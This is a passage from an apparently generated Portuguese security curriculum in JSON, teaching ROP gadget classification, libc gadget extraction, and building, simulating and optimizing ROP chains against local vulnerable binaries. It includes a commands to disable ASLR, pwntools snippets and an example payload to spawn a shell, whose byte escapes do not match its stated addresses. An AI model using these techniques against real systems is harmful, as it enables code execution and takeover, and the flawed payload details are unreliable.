                                  "tips": "Comece com assembly simples; foque em gadgets de 2-5 instruções.",
                                  "learningObjective": "Entender o conceito base de gadgets e sua origem em binários.",
                                  "commonMistakes": [
                                    "Confundir gadgets com shellcode",
                                    "Ignorar alinhamento de pilha",
                                    "Não considerar arquitetura (x86/x64)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Classificar Gadgets Primitivos",
                                  "subSteps": [
                                    "Defina gadgets primitivos: sequências simples como POP RET ou MOV.",
                                    "Identifique padrões: POP reg; RET para controle de fluxo básico.",
                                    "Use ROPgadget para extrair primitivos de um binário de exemplo.",
                                    "Classifique 5 primitivos encontrados e anote suas funções.",
                                    "Avalie limitações: controle mínimo de registradores/pilha."
                                  ],
                                  "verification": "Classifique corretamente 3 gadgets primitivos de um output de ROPgadget.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "ROPgadget tool",
                                    "Binário de teste (ex: ret2libc)",
                                    "Editor de texto"
                                  ],
                                  "tips": "Filtre por 'pop rdi; ret' para primitivos comuns em x64.",
                                  "learningObjective": "Diferenciar e identificar gadgets primitivos por padrões de instruções.",
                                  "commonMistakes": [
                                    "Classificar MOV como funcional",
                                    "Ignorar gadgets de 1-byte",
                                    "Não testar em diferentes arquiteturas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Classificar Gadgets Funcionais",
                                  "subSteps": [
                                    "Defina gadgets funcionais: chamadas diretas como 'call system' ou 'int 0x80'.",
                                    "Busque padrões: gadgets terminando em CALL/JMP a funções libc.",
                                    "Extraia funcionais com ROPgadget usando flags específicas.",
                                    "Exemplo prático: Encontre 'call system' e avalie parâmetros necessários.",
                                    "Compare com primitivos: maior impacto sem chain longa."
                                  ],
                                  "verification": "Identifique e explique o uso de 2 gadgets funcionais em um binário.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "ROPgadget",
                                    "GDB para depuração",
                                    "Libc.so.6"
                                  ],
                                  "tips": "Use --string 'system' para filtrar funcionais.",
                                  "learningObjective": "Reconhecer gadgets que invocam funções diretamente.",
                                  "commonMistakes": [
                                    "Confundir com compostos",
                                    "Esquecer dependência de argumentos",
                                    "Não validar endereço da função"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Classificar Gadgets Compostos e Avaliar Impacto",
                                  "subSteps": [
                                    "Defina compostos: chains de múltiplos gadgets para tarefas complexas (ex: dup2+execve).",
                                    "Construa um chain simples: primitivo + funcional.",
                                    "Avalie impacto: primitivos para setup, funcionais para payload, compostos para bypass ASLR.",
                                    "Teste em ambiente controlado com GDB.",
                                    "Documente prós/contras em ataques de controle de fluxo."
                                  ],
                                  "verification": "Monte e classifique um chain composto com impacto avaliado.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "GDB",
                                    "ROPgadget",
                                    "Pwntools para script",
                                    "Binário vulnerável"
                                  ],
                                  "tips": "Use ROPgadget --chain para sugestões compostas.",
                                  "learningObjective": "Classificar compostos e medir seu efeito em exploits ROP.",
                                  "commonMistakes": [
                                    "Overcomplicar chains desnecessariamente",
                                    "Ignorar overflow de pilha",
                                    "Não considerar mitigações como CFI"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário vulnerável 'vuln', execute 'ROPgadget --binary vuln | grep 'pop.*ret'' para primitivos, 'ROPgadget --string system' para funcionais, e construa chain: [POP RDI; RET; /bin/sh addr; CALL SYSTEM] como composto para spawn shell.",
                              "finalVerifications": [
                                "Classifica corretamente POP RET como primitivo.",
                                "Identifica CALL SYSTEM como funcional com exemplo.",
                                "Constrói chain composto de 3+ gadgets.",
                                "Avalia impacto: primitivos setup, funcionais payload.",
                                "Lista limitações em cenários ASLR/DEP.",
                                "Extrai gadgets de binário real com ROPgadget."
                              ],
                              "assessmentCriteria": [
                                "Precisão na distinção entre tipos (primitivo/funcional/composto).",
                                "Correta avaliação de impacto em controle de fluxo.",
                                "Uso adequado de ferramentas para extração.",
                                "Construção lógica de chains ROP.",
                                "Identificação de erros comuns em classificações.",
                                "Explicação clara de exemplos práticos."
                              ],
                              "crossCurricularConnections": [
                                "Assembly e Arquitetura de Computadores (instruções x86/x64).",
                                "Engenharia Reversa (análise de binários com objdump/Ghidra).",
                                "Exploração de Vulnerabilidades (buffer overflow/return-to-libc).",
                                "Programação em C (entendimento de chamadas de sistema).",
                                "Análise de Malware (técnicas ROP em payloads maliciosos)."
                              ],
                              "realWorldApplication": "Em pentests e CTFs, classificar gadgets ROP permite construir exploits robustos contra binários protegidos (DEP/ASLR), como em desafios Pwn do PicoCTF ou auditorias reais de software vulnerável para ganho de shell remoto."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.6.1.3",
                            "name": "Extrair gadgets de bibliotecas padrão",
                            "description": "Explorar bibliotecas como libc para encontrar gadgets úteis, utilizando scripts automatizados e considerando aleatoriedade de endereços (ASLR).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o Ambiente de Análise",
                                  "subSteps": [
                                    "Instale ferramentas essenciais como ROPgadget, pwntools e objdump via apt ou pip.",
                                    "Configure um ambiente Linux vulnerável (ex: Ubuntu 18.04) com ASLR desabilitado temporariamente usando 'echo 0 > /proc/sys/kernel/randomize_va_space'.",
                                    "Verifique a versão da libc instalada com 'ldd --version' e baixe uma cópia local se necessário.",
                                    "Crie um diretório de trabalho para o projeto com scripts e binários."
                                  ],
                                  "verification": "Execute 'ROPgadget --version' e confirme ASLR desabilitado com 'cat /proc/sys/kernel/randomize_va_space' retornando 0.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Linux VM (Ubuntu), terminal, pacotes: ropgadget, pwntools, gdb",
                                  "tips": "Use uma VM isolada para evitar comprometer o host system.",
                                  "learningObjective": "Preparar um ambiente seguro e funcional para extração de gadgets.",
                                  "commonMistakes": "Esquecer de desabilitar ASLR inicialmente, levando a endereços aleatórios."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Obter e Inspecionar a Biblioteca Padrão (libc)",
                                  "subSteps": [
                                    "Localize o arquivo libc.so com 'ldd /bin/ls' ou '/lib/x86_64-linux-gnu/libc.so.6'.",
                                    "Copie o binário para o diretório de trabalho: 'cp /lib/x86_64-linux-gnu/libc.so.6 ./libc_local.so'.",
                                    "Analise com objdump: 'objdump -d libc_local.so | grep -i ret' para identificar instruções RET iniciais.",
                                    "Use strings para overview: 'strings libc_local.so | grep gadget' e examine seções .text."
                                  ],
                                  "verification": "Confirme presença de funções conhecidas como 'system' com 'ROPgadget --binary libc_local.so --string system'.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Binário libc.so, objdump, strings, ROPgadget",
                                  "tips": "Sempre trabalhe com cópias locais para preservar integridade.",
                                  "learningObjective": "Identificar estrutura e conteúdo relevante da libc para extração.",
                                  "commonMistakes": "Usar binário do sistema sem copiar, causando permissões de escrita negadas."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Extrair Gadgets Manualmente e com Ferramentas Automatizadas",
                                  "subSteps": [
                                    "Execute ROPgadget básico: 'ROPgadget --binary libc_local.so > gadgets.txt'.",
                                    "Filtre gadgets úteis: grep por padrões como 'pop rdi ; ret', 'mov rax' em gadgets.txt.",
                                    "Crie um script Python simples usando pwntools para parsear e listar gadgets por opcode.",
                                    "Teste gadgets em GDB: 'gdb ./libc_local.so', set breakpoint e examine offsets."
                                  ],
                                  "verification": "Gere uma lista com pelo menos 10 gadgets úteis (ex: pop rsi; ret) salvos em arquivo.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "ROPgadget, pwntools, GDB, editor de texto (vim/nano)",
                                  "tips": "Priorize gadgets de 2-3 instruções para chains ROP eficientes.",
                                  "learningObjective": "Dominar extração automatizada e filtragem de gadgets ROP.",
                                  "commonMistakes": "Ignorar endianness ou arquitetura (use --binary para x86_64)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Lidar com ASLR e Automatizar Extração em Produção",
                                  "subSteps": [
                                    "Reative ASLR e use leak techniques: simule leak de libc base com script pwntools.",
                                    "Adapte script para calcular offsets dinâmicos: subtraia base leak de offsets estáticos.",
                                    "Automatize full pipeline: script que baixa libc por hash, extrai gadgets e gera chain ROP.",
                                    "Teste em binário vulnerável: compile um programa ROP simples e explore com gadgets."
                                  ],
                                  "verification": "Script roda com ASLR on e encontra 'system' offset corretamente em simulação.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Pwntools scripts, binário vulnerável de teste, libc de CTF (ex: libc6_2.27)",
                                  "tips": "Use ROPgadget --deps para dependências e --thumb para ARM se aplicável.",
                                  "learningObjective": "Aplicar extração em cenários reais com mitigações como ASLR.",
                                  "commonMistakes": "Assumir offsets fixos sem leak, falhando em ASLR."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar e Documentar Gadgets Extraídos",
                                  "subSteps": [
                                    "Crie chain ROP de teste: use gadgets para chamar system('/bin/sh').",
                                    "Execute em GDB com 'gef' plugin para visualizar stack e registers.",
                                    "Documente lista final: CSV com gadget, offset, uso (ex: pop arg).",
                                    "Compare com bases online como libc.blukat.me para validação."
                                  ],
                                  "verification": "Chain ROP executa shell em binário de teste sem crashes.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "GDB com GEF/Pwndbg, binário teste ROP, libc database online",
                                  "tips": "Sempre teste gadgets em contexto real para bad chars ou alignments.",
                                  "learningObjective": "Garantir usabilidade e documentação de gadgets para exploits.",
                                  "commonMistakes": "Não testar gadgets, levando a chains inválidas por null bytes."
                                }
                              ],
                              "practicalExample": "Em um CTF pwn, vaze o endereço de 'puts' via buffer overflow, calcule base libc, extraia offset de 'system' de libc_local.so com ROPgadget filtrando 'pop rdi; ret', construa chain ROP para system('/bin/sh') e ganhe shell remota.",
                              "finalVerifications": [
                                "Lista de 20+ gadgets úteis extraída de libc.so sem erros.",
                                "Script automatizado roda com ASLR ativado usando leaks simulados.",
                                "Chain ROP de teste chama system('/bin/sh') com sucesso em GDB.",
                                "Offsets validados contra libc database online.",
                                "Documentação completa com offsets, usos e bad chars listados.",
                                "Ambiente restaurado com ASLR reativado."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de gadgets comuns (pop/ret, mov, etc.).",
                                "Tratamento correto de ASLR via leaks e offsets relativos.",
                                "Eficiência do script automatizado (tempo < 10s para extração).",
                                "Qualidade da chain ROP de teste (sem crashes, shell spawn).",
                                "Documentação clara e completa dos gadgets.",
                                "Conhecimento demonstrado de ferramentas (ROPgadget flags corretas)."
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86_64: Entender opcodes e instruções RET/POP.",
                                "Programação Python: Scripts pwntools para automação de exploits.",
                                "Análise Reversa: Uso de objdump/GDB para binários.",
                                "Sistemas Operacionais: Compreensão de ASLR e space randomization.",
                                "Desenvolvimento de Software: Debugging e testing de chains ROP."
                              ],
                              "realWorldApplication": "Desenvolvedores de exploits em pentests/red teaming extraem gadgets de libc para bypassar NX/DEP em binários vulneráveis, como em ataques a serviços web ou CTFs profissionais, permitindo execução arbitrária de código em cenários reais de segurança."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.6.2",
                        "name": "Construção de Cadeias ROP (ROP Chains)",
                        "description": "Técnica de encadear múltiplos gadgets via pilha de controle para executar sequências desejadas, como leitura/escrita de memória ou execução de shellcode indireto.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.6.2.1",
                            "name": "Montar uma cadeia ROP básica",
                            "description": "Construir uma ROP chain simples para chamar funções como system('/bin/sh'), controlando argumentos via pilha e lidando com overflow de buffer.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de teste e entender o buffer overflow",
                                  "subSteps": [
                                    "Compilar um binário C vulnerável com buffer overflow (ex: strcpy sem bounds check)",
                                    "Desabilitar ASLR e proteções como Canary/DEP para simplificação inicial (setarch -R ou ld flags)",
                                    "Usar GDB para analisar o binário e identificar o offset do overflow até o return address",
                                    "Testar o overflow básico com pattern_create (cyclic) para confirmar controle do RIP",
                                    "Executar o binário em modo debug e observar o stack layout"
                                  ],
                                  "verification": "Confirme controle do RIP injetando um endereço conhecido (ex: int3 breakpoint) e pausando no GDB",
                                  "estimatedTime": "1-2 hours",
                                  "materials": [
                                    "GCC compiler",
                                    "GDB debugger",
                                    "pwntools ou cyclic pattern generator",
                                    "Vulnerable C source code"
                                  ],
                                  "tips": "Use 'checksec' para verificar proteções desabilitadas; comece com stack executável para simplicidade",
                                  "learningObjective": "Compreender o mecanismo de buffer overflow e controle de execução via stack",
                                  "commonMistakes": [
                                    "Esquecer de desabilitar ASLR",
                                    "Offset incorreto levando a segfaults parciais",
                                    "Não alinhar a stack corretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar gadgets ROP e endereços necessários",
                                  "subSteps": [
                                    "Executar ROPgadget ou ropper no binário para listar gadgets como 'pop rdi; ret;'",
                                    "Encontrar endereço da função system() via 'gdb info functions' ou libc symbols",
                                    "Localizar string '/bin/sh' no binário ou leak/injetar seu endereço",
                                    "Identificar gadgets auxiliares se necessário (ex: pop rsi para alinhamento)",
                                    "Listar todos os endereços em uma tabela: gadget_pop_rdi, system_addr, sh_addr"
                                  ],
                                  "verification": "Valide gadgets manualmente no GDB: 'p &system', 'ROPgadget --binary vuln | grep pop'",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "ROPgadget tool",
                                    "ROPper",
                                    "GDB with gef/pwndbg extensions",
                                    "Binário vulnerável"
                                  ],
                                  "tips": "Filtre gadgets por 'pop rdi' e 'ret'; priorize gadgets curtos para chains simples",
                                  "learningObjective": "Aprender a caçar e validar gadgets reutilizáveis de código existente",
                                  "commonMistakes": [
                                    "Gadgets inválidos (bad chars ou misaligned)",
                                    "Endereços de libc errados sem leak",
                                    "Ignorar endianness little-endian"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Construir e formatar a ROP chain na pilha",
                                  "subSteps": [
                                    "Calcular padding até return address baseado no offset do Step 1",
                                    "Montar chain: padding + pop_rdi_addr + sh_addr + system_addr",
                                    "Garantir alinhamento de stack (8 bytes no x64)",
                                    "Gerar payload com Python/pwntools: p64(pop_rdi) + p64(sh) + p64(system)",
                                    "Testar payload no GDB com 'r < payload.txt' e stepi até system call"
                                  ],
                                  "verification": "No GDB, verifique stack com 'x/20gx $rsp' mostrando chain correta; deve preparar rdi=sh_addr antes de system",
                                  "estimatedTime": "1-2 hours",
                                  "materials": [
                                    "Python com pwntools",
                                    "GDB",
                                    "Hex editor ou xxdcopy para payloads"
                                  ],
                                  "tips": "Use context.binary=ELF('./vuln') no pwntools para automação; teste chain em partes",
                                  "learningObjective": "Dominar construção de chains ROP controlando registradores via pilha",
                                  "commonMistakes": [
                                    "Ordem errada na chain (rdi antes de system)",
                                    "Falta de padding levando a overwrite parcial",
                                    "Não usar p64 para packing little-endian"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Executar, depurar e verificar o exploit",
                                  "subSteps": [
                                    "Executar payload fora do GDB para shell não-interativa",
                                    "Se falhar, debug com 'catch syscall' ou breakpoints em system",
                                    "Ajustar para ASLR parcial se necessário (leak ROP primeiro)",
                                    "Documentar chain final e reproduzir 3x com sucesso",
                                    "Limpar ambiente e reabilitar proteções para próxima lição"
                                  ],
                                  "verification": "Obtenha shell interativa executando 'cat flag.txt' ou 'whoami' no shell ROP",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "Terminal Linux x64",
                                    "Binário vulnerável",
                                    "Flag file para teste"
                                  ],
                                  "tips": "Pipe payload com (python -c '...') | ./vuln; use nohup para background se ASLR",
                                  "learningObjective": "Aplicar ROP em exploit completo e iterar em falhas",
                                  "commonMistakes": [
                                    "Shell morre ao sair do GDB (use set follow-fork-mode child)",
                                    "Payload com null bytes cortado por strcpy",
                                    "Não testar sem debug"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário 'vuln' com strcpy(buffer, argv[1]), offset=112. Chain: padding(112) + 0x40118c(pop rdi;ret) + 0x402010(/bin/sh) + 0x400590(system). Payload: 'A'*112 + p64(pop_rdi) + p64(sh) + p64(system). Execução: ./vuln $(python -c 'print \"A\"*112 + \"\\8c\\11@\\40\" + \"\\10\\20\\40\\04\" + \"\\90\\05\\40\\04\"') obtém shell.",
                              "finalVerifications": [
                                "Shell interativa obtida via system('/bin/sh') sem crash",
                                "Registrador RDI aponta corretamente para '/bin/sh' antes de system",
                                "Exploit reproduzível 3x consecutivas",
                                "Stack trace no GDB mostra execução sequencial dos gadgets",
                                "Nenhum segfault ou bad access durante chain",
                                "Comando no shell (ex: id) executa corretamente"
                              ],
                              "assessmentCriteria": [
                                "Identificação correta de pelo menos 3 gadgets válidos (100%)",
                                "Chain formatada com padding preciso e packing correto (x64 little-endian)",
                                "Controle total de argumentos via pilha demonstrado",
                                "Debug eficaz com GDB evidenciando verificações por step",
                                "Exploit funcional em ambiente controlado sem proteções",
                                "Documentação clara da chain e offsets usados"
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86-64: Entendimento de registradores e instruções RET/POP",
                                "Programação em C: Análise de stack frames e vulnerabilidades de memória",
                                "Linux Internals: Syscalls, ELF format e dynamic linking (libc)",
                                "Ferramentas de Debug: GDB avançado e scripting com pwntools",
                                "Matemática: Cálculos de offsets e alinhamento binário"
                              ],
                              "realWorldApplication": "Em pentests e CTFs (ex: pwn challenges no HackTheBox), ROP é usado para bypassar DEP em exploits reais contra serviços como web servers vulneráveis, permitindo execução de código arbitrário e gain de shell remoto em avaliações de segurança ética."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.6.2.2",
                            "name": "Simular execução de ROP chains",
                            "description": "Utilizar emuladores como QEMU ou pwntools para testar chains ROP em ambientes controlados, verificando semântica de execução e retornos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de emulação com pwntools",
                                  "subSteps": [
                                    "Instalar pwntools via pip: pip install pwntools",
                                    "Verificar instalação executando python -c 'import pwn'",
                                    "Configurar um diretório de trabalho com binário vulnerável exemplo (ex: ret2libc challenge)",
                                    "Instalar dependências adicionais como libc e ld se necessário",
                                    "Testar pwntools com um script simples de contexto: p = process('./binary')"
                                  ],
                                  "verification": "Executar um script pwntools básico sem erros e visualizar o processo rodando",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "Python 3.x",
                                    "pwntools",
                                    "Binário vulnerável de exemplo (ex: de pwnable.kr)",
                                    "Libc correspondente"
                                  ],
                                  "tips": "Use um ambiente virtual (venv) para isolar dependências e evite conflitos com bibliotecas locais",
                                  "learningObjective": "Entender e configurar pwntools para emulação de binários vulneráveis",
                                  "commonMistakes": [
                                    "Não alinhar endereços de stack (use cyclic patterns)",
                                    "Ignorar ASLR (desative com setarch -R)",
                                    "Usar pwntools sem contexto local/remote"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Preparar o binário vulnerável e construir a ROP chain primitiva",
                                  "subSteps": [
                                    "Analisar o binário com checksec, ROPgadget e objdump para gadgets",
                                    "Identificar gadgets necessários: pop rdi; ret, system, /bin/sh",
                                    "Construir payload com buffer overflow + chain ROP usando pwntools (flat ou packed)",
                                    "Calcular offsets precisos com cyclic() e pattern_offset()",
                                    "Salvar payload em arquivo binário para inspeção"
                                  ],
                                  "verification": "Gerar um payload ROP válido e inspecioná-lo com hexdump ou gdb para confirmar gadgets alinhados",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "pwntools",
                                    "ROPgadget",
                                    "checksec.sh",
                                    "Binário vulnerável",
                                    "GDB com pwndbg"
                                  ],
                                  "tips": "Sempre use ROPgadget --binary para listar gadgets locais; priorize chains curtas para simplicidade",
                                  "learningObjective": "Construir uma ROP chain funcional para bypass de proteções básicas como NX",
                                  "commonMistakes": [
                                    "Gadgets inválidos (verifique com ROPgadget --badbytes)",
                                    "Offsets errados de libc (use one_gadget para simplificar)",
                                    "Esquecer de alinhar stack pointer"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar a simulação da ROP chain em ambiente controlado",
                                  "subSteps": [
                                    "Criar script pwntools com process('./binary') e io.sendline(payload)",
                                    "Executar localmente e capturar output com io.recv()",
                                    "Simular com QEMU se necessário: qemu-x86_64 -g 1234 ./binary para attach gdb",
                                    "Repetir execuções variando payloads para testar robustez",
                                    "Logar interações com log.level = 'debug'"
                                  ],
                                  "verification": "Observar shell spawnada ou comportamento esperado no terminal/emulador",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "pwntools script",
                                    "QEMU (opcional)",
                                    "GDB/Pwndbg",
                                    "Binário e payload"
                                  ],
                                  "tips": "Desative ASLR e PIE para testes iniciais: checksec deve mostrar vulnerabilidades exploráveis",
                                  "learningObjective": "Simular execução de ROP chain e observar controle de fluxo alterado",
                                  "commonMistakes": [
                                    "Payload muito longo causando segfault",
                                    "Não lidar com canários/stack cookies",
                                    "Ignorar leaks iniciais para ROP avançada"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar semântica de execução e depurar retornos",
                                  "subSteps": [
                                    "Attach GDB ao processo/QEMU e set breakpoints em gadgets ROP",
                                    "Inspecionar registradores e stack com info registers e x/20gx $rsp",
                                    "Verificar retornos sucessivos e semântica (ex: system chamado corretamente)",
                                    "Comparar com trace esperado usando gef-pwndbg commands",
                                    "Documentar falhas e iterar na chain"
                                  ],
                                  "verification": "Traçar execução completa mostrando gadgets ativados e shell obtida sem crashes",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "GDB com Pwndbg/GEF",
                                    "pwntools para automação",
                                    "QEMU para emulação avançada"
                                  ],
                                  "tips": "Use 'ROP emulation' em pwndbg para preview da chain antes de executar",
                                  "learningObjective": "Verificar e depurar semântica ROP para garantir exploit reliability",
                                  "commonMistakes": [
                                    "Não pausar em ret para ver stack pop",
                                    "Confundir gadgets de diferentes seções (.text vs plt)",
                                    "Overlooking partial overwrites"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário ret2libc vulnerável (ex: de picoCTF), construa ROP chain: pop_rdi_ret + binsh_addr + system_addr. Payload: cyclic(40) + pop_rdi + binsh + system. Execute com p = process('./binary'); p.sendline(payload); p.interactive() resulta em $ shell spawnada, confirmada via whoami.",
                              "finalVerifications": [
                                "Pode configurar pwntools/QEMU e executar binário sem erros",
                                "Constrói ROP chain com gadgets válidos (verificados por ROPgadget)",
                                "Simulação spawna shell ou executa função ROP esperada",
                                "Depuração em GDB mostra retornos corretos e stack alinhado",
                                "Itera e corrige chains falhas autonomamente",
                                "Documenta análise de semântica com screenshots/logs"
                              ],
                              "assessmentCriteria": [
                                "Precisão na construção da chain (gadgets funcionais e alinhados)",
                                "Sucesso na simulação (exploit roda consistentemente)",
                                "Profundidade da análise (explicação de semântica e depuração)",
                                "Eficiência temporal (dentro de estimados)",
                                "Robustez contra proteções comuns (ASLR off, mas menciona mitigações)",
                                "Qualidade da documentação de verificações e erros"
                              ],
                              "crossCurricularConnections": [
                                "Assembly Language: Leitura de gadgets e registradores",
                                "Sistemas Operacionais: Entendimento de loaders, libc e chamadas system",
                                "Programação em Python: Uso avançado de pwntools para automação",
                                "Engenharia Reversa: Análise binária com tools como objdump/Ghidra",
                                "Ética em Cibersegurança: Uso responsável de emuladores em ambientes controlados"
                              ],
                              "realWorldApplication": "Em pentests e CTFs, simular ROP chains permite demonstrar exploits em binários reais sem comprometer sistemas de produção, validando vulnerabilidades buffer overflow para relatórios de segurança e desenvolvimento de mitigações como RELRO/CFProtection."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.6.2.3",
                            "name": "Otimizar chains ROP para eficiência",
                            "description": "Minimizar o tamanho da chain e alinhar a pilha, evitando gadgets ruins e garantindo portabilidade em diferentes versões de binários.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Analisar a Chain ROP Existente",
                                  "subSteps": [
                                    "Execute ROPgadget ou rp++ no binário para listar todos os gadgets disponíveis.",
                                    "Mapeie cada gadget na chain atual, anotando endereço, instruções e efeitos nos registradores.",
                                    "Calcule o tamanho total da chain em bytes e identifique operações redundantes ou ineficientes.",
                                    "Simule a execução passo a passo usando gdb ou pwndbg para observar o fluxo da stack.",
                                    "Registre dependências entre gadgets, como valores em registradores específicos."
                                  ],
                                  "verification": "Lista anotada de gadgets com mapeamento de efeitos e tamanho total calculado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Binário vulnerável, ROPgadget/rp++, gdb/pwndbg, editor de texto",
                                  "tips": "Use scripts Python com pwntools para automatizar o parsing de gadgets.",
                                  "learningObjective": "Compreender a composição e ineficiências da chain ROP inicial.",
                                  "commonMistakes": "Ignorar side-effects de gadgets que alteram registradores inesperadamente."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Minimizar o Tamanho da Chain",
                                  "subSteps": [
                                    "Identifique sequências de gadgets que podem ser substituídas por um único gadget multifuncional.",
                                    "Remova redundâncias, como múltiplos 'pop rdi; ret' desnecessários.",
                                    "Agrupe operações comuns em menos retornos usando gadgets como 'pop rdi; pop rsi; ret'.",
                                    "Otimize chamadas de system() ou execve() reduzindo argumentos para o essencial.",
                                    "Reescreva a chain e compare o novo tamanho em bytes com o original."
                                  ],
                                  "verification": "Nova chain com pelo menos 30% menos gadgets/bytes que a original, testada em simulação.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Binário, ROPgadget, pwntools para scripting, calculadora de bytes",
                                  "tips": "Priorize gadgets de bibliotecas padrão como libc para maior reutilização.",
                                  "learningObjective": "Aprender a consolidar operações para reduzir o footprint da chain.",
                                  "commonMistakes": "Remover gadgets críticos que setupam registradores para funções posteriores."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Alinhar a Pilha e Evitar Gadgets Ruins",
                                  "subSteps": [
                                    "Verifique o alinhamento da stack (RSP % 16 == 8 ou 0, dependendo da ABI).",
                                    "Insira paddings com 'pop rax; ret' ou equivalentes neutros para alinhar sem overhead.",
                                    "Teste gadgets em gdb para descartar os que causam crashes ou leaks (ex: divisões por zero).",
                                    "Substitua gadgets ruins por alternativas estáveis de .text ou .plt.",
                                    "Simule a chain completa confirmando que RSP permanece alinhado após cada retorno."
                                  ],
                                  "verification": "Execução sem crashes em gdb e stack alinhada em todos os pontos críticos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "gdb com pwndbg, binário com ASLR off, ROPgadget filtered output",
                                  "tips": "Use 'info reg rsp' em breakpoints para monitorar alinhamento em tempo real.",
                                  "learningObjective": "Dominar alinhamento de stack e seleção de gadgets confiáveis.",
                                  "commonMistakes": "Usar paddings que poluem registradores necessários para payloads."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Garantir Portabilidade e Testar Final",
                                  "subSteps": [
                                    "Teste a chain em múltiplas versões do binário (ex: libc 2.27 vs 2.31).",
                                    "Ative ASLR e PIE, ajustando endereços dinamicamente com leaks prévios.",
                                    "Valide em diferentes arquiteturas ou SOs se aplicável (ex: x86_64 Linux).",
                                    "Meça taxa de sucesso em 10+ execuções automatizadas com scripts.",
                                    "Documente offsets relativos para facilitar adaptações futuras."
                                  ],
                                  "verification": "Chain funciona em pelo menos 3 variantes de binários com >90% sucesso.",
                                  "estimatedTime": "35 minutos",
                                  "materials": "Múltiplos binários versões, scripts pwntools para fuzzing, Docker para isolamento",
                                  "tips": "Use ROP chain generators como ropper para sugestões portáveis.",
                                  "learningObjective": "Assegurar robustez e reutilização da chain em cenários reais.",
                                  "commonMistakes": "Assumir endereços fixos sem considerar ASLR/rel ro."
                                }
                              ],
                              "practicalExample": "Chain original (12 gadgets, 96 bytes): pop rdi; ret -> string_addr -> pop rsi; ret -> 0 -> pop rax; ret -> 59 -> syscall; ret (com paddings extras). Otimizada (5 gadgets, 40 bytes): pop rdi; pop rsi; pop rax; syscall; ret (usando gadget combinado de libc, com leak para /bin/sh). Teste: gdb ./vuln -ex 'r < payload' mostra shell spawn alinhado.",
                              "finalVerifications": [
                                "Tamanho da chain reduzido em pelo menos 40% (medido em bytes).",
                                "Stack alinhada (RSP mod 16 == 0 ou 8) em todos os breakpoints gdb.",
                                "Zero crashes em 20 execuções com ASLR on.",
                                "Funcionamento em 3+ versões de binários/libc.",
                                "Payload executa shell ou objetivo sem leaks detectáveis.",
                                "Todos gadgets de seções confiáveis (.text/.plt)."
                              ],
                              "assessmentCriteria": [
                                "Eficiência: Menos de 10 gadgets e <80 bytes totais.",
                                "Estabilidade: 95%+ taxa de sucesso em testes automatizados.",
                                "Portabilidade: Adaptação bem-sucedida a binários variantes sem reescrita total.",
                                "Alinhamento: Verificação manual/visual em debugger sem desalinhamentos.",
                                "Qualidade de gadgets: Nenhum com side-effects adversos ou dependências frágeis.",
                                "Documentação: Offsets e raciocínio otimizado anotados."
                              ],
                              "crossCurricularConnections": [
                                "Linguagem Assembly: Análise de instruções x86_64 e fluxos de controle.",
                                "Engenharia Reversa: Uso de ferramentas como objdump e Ghidra para gadget hunting.",
                                "Algoritmos de Otimização: Similar a minimização de grafos em teoria da computação.",
                                "Debugging Avançado: Técnicas de pwndbg e tracing de memória."
                              ],
